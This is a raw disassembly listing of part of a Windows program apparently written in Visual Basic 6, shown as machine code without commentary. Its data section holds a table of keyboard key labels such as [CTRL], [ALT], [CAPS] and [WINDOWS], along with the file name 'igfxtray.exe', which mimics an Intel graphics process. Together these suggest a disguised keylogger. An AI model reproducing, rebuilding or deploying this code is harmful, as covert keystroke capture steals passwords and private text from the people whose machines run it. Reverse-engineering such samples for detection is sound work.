  402c88:	7c 00                	jl     0x402c8a
  402c8a:	00 00                	add    %al,(%eax)
  402c8c:	02 00                	add    (%eax),%al
  402c8e:	00 00                	add    %al,(%eax)
  402c90:	5c                   	pop    %esp
  402c91:	00 00                	add    %al,(%eax)
  402c93:	00 02                	add    %al,(%edx)
  402c95:	00 00                	add    %al,(%eax)
  402c97:	00 3b                	add    %bh,(%ebx)
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	00 02                	add    %al,(%edx)
  402c9d:	00 00                	add    %al,(%eax)
  402c9f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	02 00                	add    (%eax),%al
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	5f                   	pop    %edi
  402ca9:	00 00                	add    %al,(%eax)
  402cab:	00 02                	add    %al,(%edx)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	00 3a                	add    %bh,(%edx)
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	00 02                	add    %al,(%edx)
  402cb5:	00 00                	add    %al,(%eax)
  402cb7:	00 a7 00 00 00 02    	add    %ah,0x2000000(%edi)
  402cbd:	00 00                	add    %al,(%eax)
  402cbf:	00 f9                	add    %bh,%cl
  402cc1:	00 00                	add    %al,(%eax)
  402cc3:	00 02                	add    %al,(%edx)
  402cc5:	00 00                	add    %al,(%eax)
  402cc7:	00 e9                	add    %ch,%cl
  402cc9:	00 00                	add    %al,(%eax)
  402ccb:	00 02                	add    %al,(%edx)
  402ccd:	00 00                	add    %al,(%eax)
  402ccf:	00 e8                	add    %ch,%al
  402cd1:	00 00                	add    %al,(%eax)
  402cd3:	00 02                	add    %al,(%edx)
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	00 b0 00 00 00 02    	add    %dh,0x2000000(%eax)
  402cdd:	00 00                	add    %al,(%eax)
  402cdf:	00 e0                	add    %ah,%al
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	00 02                	add    %al,(%edx)
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	00 27                	add    %ah,(%edi)
  402ce9:	00 00                	add    %al,(%eax)
  402ceb:	00 02                	add    %al,(%edx)
  402ced:	00 00                	add    %al,(%eax)
  402cef:	00 5e 00             	add    %bl,0x0(%esi)
  402cf2:	00 00                	add    %al,(%eax)
  402cf4:	02 00                	add    (%eax),%al
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	ec                   	in     (%dx),%al
  402cf9:	00 00                	add    %al,(%eax)
  402cfb:	00 02                	add    %al,(%edx)
  402cfd:	00 00                	add    %al,(%eax)
  402cff:	00 e7                	add    %ah,%bh
  402d01:	00 00                	add    %al,(%eax)
  402d03:	00 02                	add    %al,(%edx)
  402d05:	00 00                	add    %al,(%eax)
  402d07:	00 f2                	add    %dh,%dl
  402d09:	00 00                	add    %al,(%eax)
  402d0b:	00 10                	add    %dl,(%eax)
  402d0d:	00 00                	add    %al,(%eax)
  402d0f:	00 20                	add    %ah,(%eax)
  402d11:	00 5b 00             	add    %bl,0x0(%ebx)
  402d14:	43                   	inc    %ebx
  402d15:	00 41 00             	add    %al,0x0(%ecx)
  402d18:	4e                   	dec    %esi
  402d19:	00 43 00             	add    %al,0x0(%ebx)
  402d1c:	5d                   	pop    %ebp
  402d1d:	00 20                	add    %ah,(%eax)
  402d1f:	00 00                	add    %al,(%eax)
  402d21:	00 00                	add    %al,(%eax)
  402d23:	00 0e                	add    %cl,(%esi)
  402d25:	00 00                	add    %al,(%eax)
  402d27:	00 20                	add    %ah,(%eax)
  402d29:	00 5b 00             	add    %bl,0x0(%ebx)
  402d2c:	54                   	push   %esp
  402d2d:	00 41 00             	add    %al,0x0(%ecx)
  402d30:	42                   	inc    %edx
  402d31:	00 5d 00             	add    %bl,0x0(%ebp)
  402d34:	20 00                	and    %al,(%eax)
  402d36:	00 00                	add    %al,(%eax)
  402d38:	0e                   	push   %cs
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	00 20                	add    %ah,(%eax)
  402d3d:	00 5b 00             	add    %bl,0x0(%ebx)
  402d40:	43                   	inc    %ebx
  402d41:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  402d45:	00 4c 00 5d          	add    %cl,0x5d(%eax,%eax,1)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	00 0e                	add    %cl,(%esi)
  402d4d:	00 00                	add    %al,(%eax)
  402d4f:	00 20                	add    %ah,(%eax)
  402d51:	00 5b 00             	add    %bl,0x0(%ebx)
  402d54:	41                   	inc    %ecx
  402d55:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  402d59:	00 5d 00             	add    %bl,0x0(%ebp)
  402d5c:	20 00                	and    %al,(%eax)
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	12 00                	adc    (%eax),%al
  402d62:	00 00                	add    %al,(%eax)
  402d64:	20 00                	and    %al,(%eax)
  402d66:	5b                   	pop    %ebx
  402d67:	00 50 00             	add    %dl,0x0(%eax)
  402d6a:	41                   	inc    %ecx
  402d6b:	00 55 00             	add    %dl,0x0(%ebp)
  402d6e:	53                   	push   %ebx
  402d6f:	00 45 00             	add    %al,0x0(%ebp)
  402d72:	5d                   	pop    %ebp
  402d73:	00 20                	add    %ah,(%eax)
  402d75:	00 00                	add    %al,(%eax)
  402d77:	00 10                	add    %dl,(%eax)
  402d79:	00 00                	add    %al,(%eax)
  402d7b:	00 20                	add    %ah,(%eax)
  402d7d:	00 5b 00             	add    %bl,0x0(%ebx)
  402d80:	43                   	inc    %ebx
  402d81:	00 41 00             	add    %al,0x0(%ecx)
  402d84:	50                   	push   %eax
  402d85:	00 53 00             	add    %dl,0x0(%ebx)
  402d88:	5d                   	pop    %ebp
  402d89:	00 20                	add    %ah,(%eax)
  402d8b:	00 00                	add    %al,(%eax)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	00 0e                	add    %cl,(%esi)
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 20                	add    %ah,(%eax)
  402d95:	00 5b 00             	add    %bl,0x0(%ebx)
  402d98:	45                   	inc    %ebp
  402d99:	00 53 00             	add    %dl,0x0(%ebx)
  402d9c:	43                   	inc    %ebx
  402d9d:	00 5d 00             	add    %bl,0x0(%ebp)
  402da0:	20 00                	and    %al,(%eax)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	02 00                	add    (%eax),%al
  402da6:	00 00                	add    %al,(%eax)
  402da8:	20 00                	and    %al,(%eax)
  402daa:	00 00                	add    %al,(%eax)
  402dac:	14 00                	adc    $0x0,%al
  402dae:	00 00                	add    %al,(%eax)
  402db0:	20 00                	and    %al,(%eax)
  402db2:	5b                   	pop    %ebx
  402db3:	00 50 00             	add    %dl,0x0(%eax)
  402db6:	61                   	popa
  402db7:	00 67 00             	add    %ah,0x0(%edi)
  402dba:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  402dbe:	70 00                	jo     0x402dc0
  402dc0:	5d                   	pop    %ebp
  402dc1:	00 20                	add    %ah,(%eax)
  402dc3:	00 00                	add    %al,(%eax)
  402dc5:	00 00                	add    %al,(%eax)
  402dc7:	00 18                	add    %bl,(%eax)
  402dc9:	00 00                	add    %al,(%eax)
  402dcb:	00 20                	add    %ah,(%eax)
  402dcd:	00 5b 00             	add    %bl,0x0(%ebx)
  402dd0:	50                   	push   %eax
  402dd1:	00 61 00             	add    %ah,0x0(%ecx)
  402dd4:	67 00 65 00          	add    %ah,0x0(%di)
  402dd8:	44                   	inc    %esp
  402dd9:	00 6f 00             	add    %ch,0x0(%edi)
  402ddc:	77 00                	ja     0x402dde
  402dde:	6e                   	outsb  %ds:(%esi),(%dx)
  402ddf:	00 5d 00             	add    %bl,0x0(%ebp)
  402de2:	20 00                	and    %al,(%eax)
  402de4:	00 00                	add    %al,(%eax)
  402de6:	00 00                	add    %al,(%eax)
  402de8:	0e                   	push   %cs
  402de9:	00 00                	add    %al,(%eax)
  402deb:	00 20                	add    %ah,(%eax)
  402ded:	00 5b 00             	add    %bl,0x0(%ebx)
  402df0:	45                   	inc    %ebp
  402df1:	00 4e 00             	add    %cl,0x0(%esi)
  402df4:	44                   	inc    %esp
  402df5:	00 5d 00             	add    %bl,0x0(%ebp)
  402df8:	20 00                	and    %al,(%eax)
  402dfa:	00 00                	add    %al,(%eax)
  402dfc:	10 00                	adc    %al,(%eax)
  402dfe:	00 00                	add    %al,(%eax)
  402e00:	20 00                	and    %al,(%eax)
  402e02:	5b                   	pop    %ebx
  402e03:	00 48 00             	add    %cl,0x0(%eax)
  402e06:	4f                   	dec    %edi
  402e07:	00 4d 00             	add    %cl,0x0(%ebp)
  402e0a:	45                   	inc    %ebp
  402e0b:	00 5d 00             	add    %bl,0x0(%ebp)
  402e0e:	20 00                	and    %al,(%eax)
  402e10:	00 00                	add    %al,(%eax)
  402e12:	00 00                	add    %al,(%eax)
  402e14:	10 00                	adc    %al,(%eax)
  402e16:	00 00                	add    %al,(%eax)
  402e18:	20 00                	and    %al,(%eax)
  402e1a:	5b                   	pop    %ebx
  402e1b:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  402e1f:	00 46 00             	add    %al,0x0(%esi)
  402e22:	54                   	push   %esp
  402e23:	00 5d 00             	add    %bl,0x0(%ebp)
  402e26:	20 00                	and    %al,(%eax)
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	00 00                	add    %al,(%eax)
  402e2c:	0c 00                	or     $0x0,%al
  402e2e:	00 00                	add    %al,(%eax)
  402e30:	20 00                	and    %al,(%eax)
  402e32:	5b                   	pop    %ebx
  402e33:	00 55 00             	add    %dl,0x0(%ebp)
  402e36:	50                   	push   %eax
  402e37:	00 5d 00             	add    %bl,0x0(%ebp)
  402e3a:	20 00                	and    %al,(%eax)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 00                	add    %al,(%eax)
  402e40:	12 00                	adc    (%eax),%al
  402e42:	00 00                	add    %al,(%eax)
  402e44:	20 00                	and    %al,(%eax)
  402e46:	5b                   	pop    %ebx
  402e47:	00 52 00             	add    %dl,0x0(%edx)
  402e4a:	49                   	dec    %ecx
  402e4b:	00 47 00             	add    %al,0x0(%edi)
  402e4e:	48                   	dec    %eax
  402e4f:	00 54 00 5d          	add    %dl,0x5d(%eax,%eax,1)
  402e53:	00 20                	add    %ah,(%eax)
  402e55:	00 00                	add    %al,(%eax)
  402e57:	00 10                	add    %dl,(%eax)
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	00 20                	add    %ah,(%eax)
  402e5d:	00 5b 00             	add    %bl,0x0(%ebx)
  402e60:	44                   	inc    %esp
  402e61:	00 4f 00             	add    %cl,0x0(%edi)
  402e64:	57                   	push   %edi
  402e65:	00 4e 00             	add    %cl,0x0(%esi)
  402e68:	5d                   	pop    %ebp
  402e69:	00 20                	add    %ah,(%eax)
  402e6b:	00 00                	add    %al,(%eax)
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	00 14 00             	add    %dl,(%eax,%eax,1)
  402e72:	00 00                	add    %al,(%eax)
  402e74:	20 00                	and    %al,(%eax)
  402e76:	5b                   	pop    %ebx
  402e77:	00 53 00             	add    %dl,0x0(%ebx)
  402e7a:	45                   	inc    %ebp
  402e7b:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  402e7f:	00 43 00             	add    %al,0x0(%ebx)
  402e82:	54                   	push   %esp
  402e83:	00 5d 00             	add    %bl,0x0(%ebp)
  402e86:	20 00                	and    %al,(%eax)
  402e88:	00 00                	add    %al,(%eax)
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	12 00                	adc    (%eax),%al
  402e8e:	00 00                	add    %al,(%eax)
  402e90:	20 00                	and    %al,(%eax)
  402e92:	5b                   	pop    %ebx
  402e93:	00 50 00             	add    %dl,0x0(%eax)
  402e96:	52                   	push   %edx
  402e97:	00 49 00             	add    %cl,0x0(%ecx)
  402e9a:	4e                   	dec    %esi
  402e9b:	00 54 00 5d          	add    %dl,0x5d(%eax,%eax,1)
  402e9f:	00 20                	add    %ah,(%eax)
  402ea1:	00 00                	add    %al,(%eax)
  402ea3:	00 0e                	add    %cl,(%esi)
  402ea5:	00 00                	add    %al,(%eax)
  402ea7:	00 20                	add    %ah,(%eax)
  402ea9:	00 5b 00             	add    %bl,0x0(%ebx)
  402eac:	49                   	dec    %ecx
  402ead:	00 4e 00             	add    %cl,0x0(%esi)
  402eb0:	53                   	push   %ebx
  402eb1:	00 5d 00             	add    %bl,0x0(%ebp)
  402eb4:	20 00                	and    %al,(%eax)
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	0e                   	push   %cs
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	00 20                	add    %ah,(%eax)
  402ebd:	00 5b 00             	add    %bl,0x0(%ebx)
  402ec0:	44                   	inc    %esp
  402ec1:	00 45 00             	add    %al,0x0(%ebp)
  402ec4:	4c                   	dec    %esp
  402ec5:	00 5d 00             	add    %bl,0x0(%ebp)
  402ec8:	20 00                	and    %al,(%eax)
  402eca:	00 00                	add    %al,(%eax)
  402ecc:	10 00                	adc    %al,(%eax)
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	20 00                	and    %al,(%eax)
  402ed2:	5b                   	pop    %ebx
  402ed3:	00 48 00             	add    %cl,0x0(%eax)
  402ed6:	45                   	inc    %ebp
  402ed7:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  402edb:	00 5d 00             	add    %bl,0x0(%ebp)
  402ede:	20 00                	and    %al,(%eax)
  402ee0:	00 00                	add    %al,(%eax)
  402ee2:	00 00                	add    %al,(%eax)
  402ee4:	16                   	push   %ss
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 20                	add    %ah,(%eax)
  402ee9:	00 5b 00             	add    %bl,0x0(%ebx)
  402eec:	57                   	push   %edi
  402eed:	00 49 00             	add    %cl,0x0(%ecx)
  402ef0:	4e                   	dec    %esi
  402ef1:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  402ef5:	00 57 00             	add    %dl,0x0(%edi)
  402ef8:	53                   	push   %ebx
  402ef9:	00 5d 00             	add    %bl,0x0(%ebp)
  402efc:	20 00                	and    %al,(%eax)
  402efe:	00 00                	add    %al,(%eax)
  402f00:	5f                   	pop    %edi
  402f01:	5f                   	pop    %edi
  402f02:	76 62                	jbe    0x402f66
  402f04:	61                   	popa
  402f05:	56                   	push   %esi
  402f06:	61                   	popa
  402f07:	72 43                	jb     0x402f4c
  402f09:	61                   	popa
  402f0a:	74 00                	je     0x402f0c
  402f0c:	5f                   	pop    %edi
  402f0d:	5f                   	pop    %edi
  402f0e:	76 62                	jbe    0x402f72
  402f10:	61                   	popa
  402f11:	53                   	push   %ebx
  402f12:	74 72                	je     0x402f86
  402f14:	56                   	push   %esi
  402f15:	61                   	popa
  402f16:	72 56                	jb     0x402f6e
  402f18:	61                   	popa
  402f19:	6c                   	insb   (%dx),%es:(%edi)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	5f                   	pop    %edi
  402f1d:	5f                   	pop    %edi
  402f1e:	76 62                	jbe    0x402f82
  402f20:	61                   	popa
  402f21:	4c                   	dec    %esp
  402f22:	65 6e                	outsb  %gs:(%esi),(%dx)
  402f24:	42                   	inc    %edx
  402f25:	73 74                	jae    0x402f9b
  402f27:	72 00                	jb     0x402f29
  402f29:	00 00                	add    %al,(%eax)
  402f2b:	00 5f 5f             	add    %bl,0x5f(%edi)
  402f2e:	76 62                	jbe    0x402f92
  402f30:	61                   	popa
  402f31:	53                   	push   %ebx
  402f32:	74 72                	je     0x402fa6
  402f34:	43                   	inc    %ebx
  402f35:	61                   	popa
  402f36:	74 00                	je     0x402f38
  402f38:	5f                   	pop    %edi
  402f39:	5f                   	pop    %edi
  402f3a:	76 62                	jbe    0x402f9e
  402f3c:	61                   	popa
  402f3d:	53                   	push   %ebx
  402f3e:	65 74 53             	gs je  0x402f94
  402f41:	79 73                	jns    0x402fb6
  402f43:	74 65                	je     0x402faa
  402f45:	6d                   	insl   (%dx),%es:(%edi)
  402f46:	45                   	inc    %ebp
  402f47:	72 72                	jb     0x402fbb
  402f49:	6f                   	outsl  %ds:(%esi),(%dx)
  402f4a:	72 00                	jb     0x402f4c
  402f4c:	5f                   	pop    %edi
  402f4d:	5f                   	pop    %edi
  402f4e:	76 62                	jbe    0x402fb2
  402f50:	61                   	popa
  402f51:	53                   	push   %ebx
  402f52:	74 72                	je     0x402fc6
  402f54:	54                   	push   %esp
  402f55:	6f                   	outsl  %ds:(%esi),(%dx)
  402f56:	41                   	inc    %ecx
  402f57:	6e                   	outsb  %ds:(%esi),(%dx)
  402f58:	73 69                	jae    0x402fc3
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	5f                   	pop    %edi
  402f5d:	5f                   	pop    %edi
  402f5e:	76 62                	jbe    0x402fc2
  402f60:	61                   	popa
  402f61:	46                   	inc    %esi
  402f62:	72 65                	jb     0x402fc9
  402f64:	65 4f                	gs dec %edi
  402f66:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  402f69:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402f70:	5f                   	pop    %edi
  402f71:	5f                   	pop    %edi
  402f72:	76 62                	jbe    0x402fd6
  402f74:	61                   	popa
  402f75:	46                   	inc    %esi
  402f76:	72 65                	jb     0x402fdd
  402f78:	65 53                	gs push %ebx
  402f7a:	74 72                	je     0x402fee
  402f7c:	4c                   	dec    %esp
  402f7d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402f84:	5f                   	pop    %edi
  402f85:	5f                   	pop    %edi
  402f86:	76 62                	jbe    0x402fea
  402f88:	61                   	popa
  402f89:	4e                   	dec    %esi
  402f8a:	65 77 32             	gs ja  0x402fbf
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 50 28             	add    %dl,0x28(%eax)
  402f92:	40                   	inc    %eax
  402f93:	00 d0                	add    %dl,%al
  402f95:	83 40 00 ff          	addl   $0xffffffff,0x0(%eax)
  402f99:	ff                   	(bad)
  402f9a:	ff                   	(bad)
  402f9b:	ff f4                	push   %esp
  402f9d:	2f                   	das
  402f9e:	40                   	inc    %eax
	...
  402ff7:	00 2c 1d 40 00 ff ff 	add    %ch,-0xffc0(,%ebx,1)
  402ffe:	ff                   	(bad)
  402fff:	ff 00                	incl   (%eax)
  403001:	00 00                	add    %al,(%eax)
  403003:	00 08                	add    %cl,(%eax)
  403005:	00 00                	add    %al,(%eax)
  403007:	00 00                	add    %al,(%eax)
  403009:	00 00                	add    %al,(%eax)
  40300b:	00 c0                	add    %al,%al
  40300d:	2f                   	das
  40300e:	40                   	inc    %eax
  40300f:	00 00                	add    %al,(%eax)
  403011:	00 00                	add    %al,(%eax)
  403013:	00 a0 2f 40 00 98    	add    %ah,-0x67ffbfd1(%eax)
  403019:	2f                   	das
  40301a:	40                   	inc    %eax
  40301b:	00 98 2f 40 00 00    	add    %bl,0x402f(%eax)
	...
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40302f:	00 04 00             	add    %al,(%eax,%eax,1)
  403032:	00 00                	add    %al,(%eax)
  403034:	00 00                	add    %al,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	30 21                	xor    %ah,(%ecx)
  40303a:	40                   	inc    %eax
  40303b:	00 ff                	add    %bh,%bh
  40303d:	ff                   	(bad)
  40303e:	ff                   	(bad)
  40303f:	ff 00                	incl   (%eax)
  403041:	00 00                	add    %al,(%eax)
  403043:	00 98 2f 40 00 00    	add    %bl,0x402f(%eax)
  403049:	00 00                	add    %al,(%eax)
  40304b:	00 5c 30 40          	add    %bl,0x40(%eax,%esi,1)
  40304f:	00 00                	add    %al,(%eax)
  403051:	00 00                	add    %al,(%eax)
  403053:	00 ff                	add    %bh,%bh
  403055:	ff                   	(bad)
  403056:	ff                   	(bad)
  403057:	ff 00                	incl   (%eax)
  403059:	00 00                	add    %al,(%eax)
  40305b:	00 69 67             	add    %ch,0x67(%ecx)
  40305e:	66 78 74             	data16 js 0x4030d5
  403061:	72 61                	jb     0x4030c4
  403063:	79 2e                	jns    0x403093
  403065:	65 78 65             	gs js  0x4030cd
  403068:	00 00                	add    %al,(%eax)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	08 27                	or     %ah,(%edi)
  40306e:	40                   	inc    %eax
  40306f:	00 f8                	add    %bh,%al
  403071:	24 40                	and    $0x40,%al
  403073:	00 d4                	add    %dl,%ah
  403075:	83 40 00 08          	addl   $0x8,0x0(%eax)
  403079:	27                   	daa
  40307a:	40                   	inc    %eax
  40307b:	00 38                	add    %bh,(%eax)
  40307d:	27                   	daa
  40307e:	40                   	inc    %eax
  40307f:	00 d8                	add    %bl,%al
  403081:	83 40 00 08          	addl   $0x8,0x0(%eax)
  403085:	27                   	daa
  403086:	40                   	inc    %eax
  403087:	00 50 27             	add    %dl,0x27(%eax)
  40308a:	40                   	inc    %eax
  40308b:	00 dc                	add    %bl,%ah
  40308d:	83 40 00 08          	addl   $0x8,0x0(%eax)
  403091:	27                   	daa
  403092:	40                   	inc    %eax
  403093:	00 68 27             	add    %ch,0x27(%eax)
  403096:	40                   	inc    %eax
  403097:	00 e0                	add    %ah,%al
  403099:	83 40 00 cc          	addl   $0xffffffcc,0x0(%eax)
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	e9 e9 e9 e9 cc       	jmp    0xcd2a1a8e
  4030a5:	cc                   	int3
  4030a6:	cc                   	int3
  4030a7:	cc                   	int3
  4030a8:	cc                   	int3
  4030a9:	cc                   	int3
  4030aa:	cc                   	int3
  4030ab:	cc                   	int3
  4030ac:	cc                   	int3
  4030ad:	cc                   	int3
  4030ae:	cc                   	int3
  4030af:	cc                   	int3
  4030b0:	55                   	push   %ebp
  4030b1:	8b ec                	mov    %esp,%ebp
  4030b3:	83 ec 0c             	sub    $0xc,%esp
  4030b6:	68 c6 11 40 00       	push   $0x4011c6
  4030bb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4030c1:	50                   	push   %eax
  4030c2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4030c9:	83 ec 2c             	sub    $0x2c,%esp
  4030cc:	53                   	push   %ebx
  4030cd:	56                   	push   %esi
  4030ce:	57                   	push   %edi
  4030cf:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4030d2:	c7 45 f8 18 11 40 00 	movl   $0x401118,-0x8(%ebp)
  4030d9:	8b 55 08             	mov    0x8(%ebp),%edx
  4030dc:	33 ff                	xor    %edi,%edi
  4030de:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4030e1:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4030e4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4030e7:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4030ea:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4030ed:	89 7d cc             	mov    %edi,-0x34(%ebp)
  4030f0:	89 7d c8             	mov    %edi,-0x38(%ebp)
  4030f3:	ff 15 c8 10 40 00    	call   *0x4010c8
  4030f9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4030fc:	50                   	push   %eax
  4030fd:	e8 ae 08 00 00       	call   0x4039b0
  403102:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403105:	8d 55 c8             	lea    -0x38(%ebp),%edx
  403108:	51                   	push   %ecx
  403109:	52                   	push   %edx
  40310a:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40310d:	ff 15 0c 10 40 00    	call   *0x40100c
  403113:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403116:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403119:	50                   	push   %eax
  40311a:	51                   	push   %ecx
  40311b:	e8 80 00 00 00       	call   0x4031a0
  403120:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  403123:	52                   	push   %edx
  403124:	ff 15 18 10 40 00    	call   *0x401018
  40312a:	8b d0                	mov    %eax,%edx
  40312c:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40312f:	ff 15 f0 10 40 00    	call   *0x4010f0
  403135:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403138:	ff 15 10 10 40 00    	call   *0x401010
  40313e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403141:	50                   	push   %eax
  403142:	57                   	push   %edi
  403143:	ff 15 58 10 40 00    	call   *0x401058
  403149:	68 89 31 40 00       	push   $0x403189
  40314e:	eb 19                	jmp    0x403169
  403150:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  403154:	74 09                	je     0x40315f
  403156:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403159:	ff 15 08 11 40 00    	call   *0x401108
  40315f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403162:	ff 15 10 10 40 00    	call   *0x401010
  403168:	c3                   	ret
  403169:	8b 35 44 10 40 00    	mov    0x401044,%esi
  40316f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  403172:	33 ff                	xor    %edi,%edi
  403174:	51                   	push   %ecx
  403175:	57                   	push   %edi
  403176:	ff d6                	call   *%esi
  403178:	8d 55 c8             	lea    -0x38(%ebp),%edx
  40317b:	52                   	push   %edx
  40317c:	57                   	push   %edi
  40317d:	ff d6                	call   *%esi
  40317f:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403182:	ff 15 08 11 40 00    	call   *0x401108
  403188:	c3                   	ret
  403189:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40318c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40318f:	5f                   	pop    %edi
  403190:	5e                   	pop    %esi
  403191:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403198:	5b                   	pop    %ebx
  403199:	8b e5                	mov    %ebp,%esp
  40319b:	5d                   	pop    %ebp
  40319c:	c2 04 00             	ret    $0x4
  40319f:	90                   	nop
  4031a0:	55                   	push   %ebp
  4031a1:	8b ec                	mov    %esp,%ebp
  4031a3:	83 ec 0c             	sub    $0xc,%esp
  4031a6:	68 c6 11 40 00       	push   $0x4011c6
  4031ab:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4031b1:	50                   	push   %eax
  4031b2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4031b9:	83 ec 28             	sub    $0x28,%esp
  4031bc:	53                   	push   %ebx
  4031bd:	56                   	push   %esi
  4031be:	57                   	push   %edi
  4031bf:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4031c2:	c7 45 f8 28 11 40 00 	movl   $0x401128,-0x8(%ebp)
  4031c9:	8b 75 0c             	mov    0xc(%ebp),%esi
  4031cc:	33 c0                	xor    %eax,%eax
  4031ce:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4031d1:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4031d4:	8b 06                	mov    (%esi),%eax
  4031d6:	50                   	push   %eax
  4031d7:	6a 01                	push   $0x1
  4031d9:	ff 15 70 10 40 00    	call   *0x401070
  4031df:	8b 0e                	mov    (%esi),%ecx
  4031e1:	8b f8                	mov    %eax,%edi
  4031e3:	51                   	push   %ecx
  4031e4:	6a 01                	push   $0x1
  4031e6:	ff 15 ac 10 40 00    	call   *0x4010ac
  4031ec:	2b c7                	sub    %edi,%eax
  4031ee:	70 72                	jo     0x403262
  4031f0:	83 c0 01             	add    $0x1,%eax
  4031f3:	70 6d                	jo     0x403262
  4031f5:	50                   	push   %eax
  4031f6:	56                   	push   %esi
  4031f7:	e8 74 00 00 00       	call   0x403270
  4031fc:	8d 55 cc             	lea    -0x34(%ebp),%edx
  4031ff:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403202:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403205:	c7 45 cc 08 00 00 00 	movl   $0x8,-0x34(%ebp)
  40320c:	ff 15 08 10 40 00    	call   *0x401008
  403212:	68 33 32 40 00       	push   $0x403233
  403217:	eb 19                	jmp    0x403232
  403219:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  40321d:	74 09                	je     0x403228
  40321f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403222:	ff 15 10 10 40 00    	call   *0x401010
  403228:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40322b:	ff 15 10 10 40 00    	call   *0x401010
  403231:	c3                   	ret
  403232:	c3                   	ret
  403233:	8b 45 08             	mov    0x8(%ebp),%eax
  403236:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  403239:	8b d0                	mov    %eax,%edx
  40323b:	5f                   	pop    %edi
  40323c:	5e                   	pop    %esi
  40323d:	5b                   	pop    %ebx
  40323e:	89 0a                	mov    %ecx,(%edx)
  403240:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403243:	89 4a 04             	mov    %ecx,0x4(%edx)
  403246:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403249:	89 4a 08             	mov    %ecx,0x8(%edx)
  40324c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40324f:	89 4a 0c             	mov    %ecx,0xc(%edx)
  403252:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403255:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40325c:	8b e5                	mov    %ebp,%esp
  40325e:	5d                   	pop    %ebp
  40325f:	c2 08 00             	ret    $0x8
  403262:	ff 15 b8 10 40 00    	call   *0x4010b8
  403268:	90                   	nop
  403269:	90                   	nop
  40326a:	90                   	nop
  40326b:	90                   	nop
  40326c:	90                   	nop
  40326d:	90                   	nop
  40326e:	90                   	nop
  40326f:	90                   	nop
  403270:	55                   	push   %ebp
  403271:	8b ec                	mov    %esp,%ebp
